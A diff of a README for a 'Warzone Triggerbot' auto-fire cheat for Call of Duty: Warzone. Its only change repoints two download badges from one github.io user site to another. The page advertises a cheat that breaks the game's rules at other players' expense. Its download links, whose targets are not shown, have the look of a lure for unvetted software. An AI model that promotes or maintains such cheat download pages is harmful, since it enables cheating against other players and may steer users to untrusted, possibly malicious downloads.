@@ -1,7 +1,7 @@
 # 🔫 Warzone Triggerbot — Visual Auto-Fire Assistant Tool
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-yellow?style=for-the-badge)](https://mazimazeh910.github.io/.github/triggerbot-warzone)  
-[![Download Now](https://img.shields.io/badge/Download_Now-black?style=for-the-badge&logo=call-of-duty)](https://mazimazeh910.github.io/.github/triggerbot-warzone)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-yellow?style=for-the-badge)](https://archiemcmahonreic.github.io/.github/triggerbot-warzone)  
+[![Download Now](https://img.shields.io/badge/Download_Now-black?style=for-the-badge&logo=call-of-duty)](https://archiemcmahonreic.github.io/.github/triggerbot-warzone)
 
 ---
 
